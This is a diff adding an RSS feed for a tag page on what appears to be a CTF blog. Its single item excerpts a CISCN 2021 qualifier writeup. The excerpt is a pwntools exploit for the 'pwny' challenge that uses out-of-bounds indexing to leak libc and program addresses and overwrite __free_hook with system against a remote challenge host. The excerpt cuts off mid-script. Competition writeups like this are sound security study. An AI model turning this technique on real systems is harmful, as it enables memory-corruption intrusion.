@@ -1,0 +1,21 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>ReflectionMethod on wh1sper</title>
+    <link>https://anthem-whisper.github.io/tags/reflectionmethod/</link>
+    <description>Recent content in ReflectionMethod on wh1sper</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>zh-cn</language>
+    <lastBuildDate>Sun, 16 May 2021 00:00:00 +0000</lastBuildDate><atom:link href="https://anthem-whisper.github.io/tags/reflectionmethod/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>CISCN 2021 Quals Writeup by X1cT34m</title>
+      <link>https://anthem-whisper.github.io/p/ciscn-2021-quals-writeup-by-x1ct34m/</link>
+      <pubDate>Sun, 16 May 2021 00:00:00 +0000</pubDate>
+      
+      <guid>https://anthem-whisper.github.io/p/ciscn-2021-quals-writeup-by-x1ct34m/</guid>
+      <description>Pwn pwny 越界任意写
+from pwn import* def menu(ch): p.sendlineafter(&amp;#39;choice:&amp;#39;,str(ch)) p = process(&amp;#39;./main&amp;#39;) libc = ELF(&amp;#39;./libc-2.27.so&amp;#39;) p = remote(&amp;#39;124.70.35.238&amp;#39;,23807) menu(2) p.sendlineafter(&amp;#39;Index:&amp;#39;,&amp;#39;256&amp;#39;) menu(2) p.sendlineafter(&amp;#39;Index:&amp;#39;,&amp;#39;256&amp;#39;) menu(1) p.sendlineafter(&amp;#39;Index:&amp;#39;,p64((-8&amp;amp;0xFFFFFFFFFFFFFFFF))) p.recvuntil(&amp;#39;Result: &amp;#39;) libc_base = int(p.recv(12),16) - libc.sym[&amp;#39;_IO_2_1_stdout_&amp;#39;] log.info(&amp;#39;LIBC:\t&amp;#39; + hex(libc_base)) menu(1) p.sendlineafter(&amp;#39;Index:&amp;#39;,p64((-11&amp;amp;0xFFFFFFFFFFFFFFFF))) p.recvuntil(&amp;#39;Result: &amp;#39;) proc_base = int(p.recv(12),16) - 0x202008 log.info(&amp;#39;PROC:\t&amp;#39; + hex(proc_base)) free_hook = libc_base + libc.sym[&amp;#39;__free_hook&amp;#39;] L = proc_base + 0x202060 offset = (free_hook - L)/8 menu(2) p.sendlineafter(&amp;#39;Index:&amp;#39;,str(offset)) p.send(p64(libc_base + libc.sym[&amp;#39;system&amp;#39;])) IO_list_all = libc_base + libc.</description>
+    </item>
+    
+  </channel>
+</rss>
